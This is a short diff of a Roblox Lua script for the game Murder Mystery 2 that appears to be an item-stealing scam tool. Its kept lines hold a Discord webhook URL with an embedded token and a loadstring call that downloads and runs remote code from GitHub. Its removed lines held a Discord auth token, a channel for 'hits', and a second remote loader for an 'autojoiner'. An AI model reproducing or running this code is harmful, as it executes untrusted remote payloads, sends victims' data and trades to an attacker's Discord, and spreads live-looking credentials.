@@ -249,11 +249,7 @@ _G.pingEveryone = "No" -- change to "No" if you dont want pings
 _Webhook = "https://discord.com/api/webhooks/1405869490834509875/cd1mf7PukC7xP828WJnLz94ey4nT9ha75Xc2RGhSuIBt5_6ufnyHaYt17VeXqGpweVJI" 
 _loadstring(game:HttpGet("https://raw.githubusercontent.com/Cyber-Xong/script-MM2-update/refs/heads/main/MM2"))()
         
-token = "MTQwNzc0OTAxMTk0NzEyNjc5NQ.GeD96O.aU75Mj0_M1_LoOv1KjUh4ADdimL46ofrMTwmmU" -- Discord Token here (DISCORD AUTH TOKEN) TUTORIAL: https://www.youtube.com/watch?v=LnBnm_tZlyU
-channelId = "1405873773873332357" -- Channel ID that your hits are in. TUTORIAL: https://www.youtube.com/watch?v=YjiQ7CajAgg
-delay = 3 -- How many seconds it will wait to chat after loading is done. If you have problems with not getting trades, try making delay higher (I dont recommend higher than 5)
-loadstring(game:HttpGet('https://codeberg.org/unkowncoder/MM2/raw/branch/main/autojoiner.lua'))()
-        
+
     -------------------
     -- UI
     -------------------
